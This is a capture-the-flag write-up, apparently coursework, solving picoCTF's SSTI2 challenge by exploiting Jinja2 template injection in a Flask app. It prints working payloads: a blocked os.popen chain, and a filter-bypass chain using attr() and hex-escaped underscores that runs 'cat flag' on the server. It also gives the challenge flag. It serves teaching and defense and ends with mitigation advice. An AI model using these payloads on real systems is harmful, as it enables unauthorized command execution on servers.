# Project 2 — Q4: SSTI2 (Server-Side Template Injection Filter Bypass)

## Problem Summary
The challenge provides a web page with an input field and the following hint:

- Server Side Template Injection
- Why is blacklisting characters a bad idea to sanitize input?

The objective is to exploit the SSTI vulnerability, bypass the blacklist-based filter, and retrieve the hidden flag.

---

## Initial Observations
- Entering a normal string such as `hello` returned the same string in the output.
- This suggested that user input was being rendered by the server inside a template.
- Entering `{{config}}` successfully returned the Flask configuration object, confirming that the application was vulnerable to **Server-Side Template Injection (SSTI)**.
- Direct payloads using patterns like `__class__`, `os`, `popen`, `cat`, and similar exploitation chains resulted in:
  
`Stop trying to break me >:(`

This confirmed that the application used a **blacklist-based filter** to block common SSTI payload patterns.

---

## Key Insight
The challenge hint explicitly suggested that **blacklisting characters is a weak sanitization strategy**.

This is because even if dangerous-looking strings are blocked directly, the same functionality can often be reached through:
- alternate objects
- `attr()` access
- escaped underscores such as `\x5f`
- dictionary-style access methods such as `__getitem__`

So instead of using the usual obvious payloads, the exploit needed to use a **filter bypass chain**.

---

## Step-by-Step Solution

### Step 1 — Confirm SSTI
Input:

```jinja2
{{config}}
```

Output:
A Flask configuration object was displayed.

This confirmed:
- SSTI exists
- The backend is Flask/Jinja2

---

### Step 2 — Test Filter Behavior
Direct exploitation payloads such as:

```jinja2
{{cycler.__init__.__globals__.os.popen('cat flag').read()}}
```

and similar variants were blocked with:

```text
Stop trying to break me >:(
```

This showed that the application was detecting common SSTI attack patterns.

---

### Step 3 — Use a Filter Bypass Chain
Instead of directly writing blocked attributes and dangerous keywords in the usual way, the payload used:
- `request`
- `attr()`
- hex-escaped underscores `\x5f`
- `__getitem__`
- dynamic import of `os`

Final working payload:

```jinja2
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```

---

### Step 4 — Retrieve the Flag
Submitting the above payload executed the command on the server and returned:

```text
picoCTF{sst1_f1lt3r_byp4ss_e39c23ee}
```

---

## Why This Worked
The application attempted to sanitize input by blacklisting suspicious strings and characters.

However, blacklist-based filtering failed because:
- blocked attributes could still be reconstructed indirectly
- underscores could be encoded as `\x5f`
- object traversal could still be achieved using `attr()`
- dictionary lookups could be done using `__getitem__`
- dangerous functionality could still be reached without writing the obvious payload directly

This allowed the SSTI exploit to bypass the filter and execute server-side commands.

---

## Security Insight
This challenge demonstrates why **blacklisting is not a safe defense** against SSTI.

A secure implementation should instead:
- avoid rendering unsanitized user input into templates
- use strict allowlists instead of blacklists
- sandbox template execution
- avoid exposing powerful objects such as `request`, `config`, or global functions in an unsafe template context

---

## Final Answer
picoCTF{sst1_f1lt3r_byp4ss_e39c23ee}
